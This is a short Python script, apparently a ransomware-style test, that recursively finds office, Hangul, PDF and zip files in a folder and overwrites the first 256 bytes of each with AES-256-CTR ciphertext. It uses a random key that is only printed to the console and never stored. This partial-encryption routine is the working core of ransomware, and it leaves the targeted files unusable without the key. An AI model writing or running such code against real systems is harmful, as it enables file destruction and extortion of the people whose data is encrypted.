from Crypto.Cipher import AES
from Crypto.Util import Counter
import os
import binascii

# AES encryption function
def encrypt_aes_ctr(data, key, iv):
    # Create a counter object for AES-CTR mode with a 128-bit block size.
    ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
    
    # Encrypt the data using AES-CTR mode.
    encrypted_data = cipher.encrypt(data)
    
    return encrypted_data

if __name__ == "__main__":
    # Generate a 256-bit AES key (32 bytes).
    aes_key = os.urandom(32)

    # Generate a 128-bit IV (16 bytes).
    iv = os.urandom(16)

    # Print the AES key and IV as hexadecimal strings.
    aes_key_hex = aes_key.hex().upper()
    iv_hex = iv.hex().upper()
    print("AES Encryption Key:", aes_key_hex)
    print("IV:", iv_hex)

    # Specify the input folder path.
    folder_path = 'C:/Users/kyj08/OneDrive/바탕 화면/Test/'  # Enter the desired folder path here.

    # Create an empty list to store the file paths of all files in the folder.
    file_list = []

    # Recursively search for all files in the input folder and its subfolders,
    # and add the paths of files with the specified extensions to the list.
    extensions = ('zip', 'hwp', 'hwpx', 'xlsx', 'docx', 'pptx', 'pdf')  # Specify the extensions to search for
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            ext = file.lower().split('.')[-1]  # Get the file extension
            if ext in extensions:
                file_list.append(os.path.join(root, file))

    # Define the byte_size to read from the beginning of each file.
    byte_size = 256  # Fixed byte size

    for file_path in file_list:
        try:
            with open(file_path, 'rb+') as file:
                # Read the first byte_size bytes of the file as binary data.
                binary_data = file.read(byte_size)

                # Encrypt the binary_data using AES-256 CTR mode with the shared key and IV.
                encrypted_data = encrypt_aes_ctr(binary_data, aes_key, iv)

                # Seek back to the beginning of the file and write the encrypted_data.
                file.seek(0)
                file.write(encrypted_data)

                # Convert the encrypted binary_data to uppercase hex values and print.
                hex_data = binascii.hexlify(encrypted_data).decode('utf-8').upper()

                # Write the remaining binary data (beyond byte_size) back to the file.
                remaining_data = file.read()
                file.seek(byte_size)
                file.write(remaining_data)

                # Print the results.
                print(f"File partially encrypted: {file_path}")
                print("AES-CTR Encrypted Hex value:", hex_data)

        except Exception as e:
            print(f"An error occurred for file {file_path}: {e}")
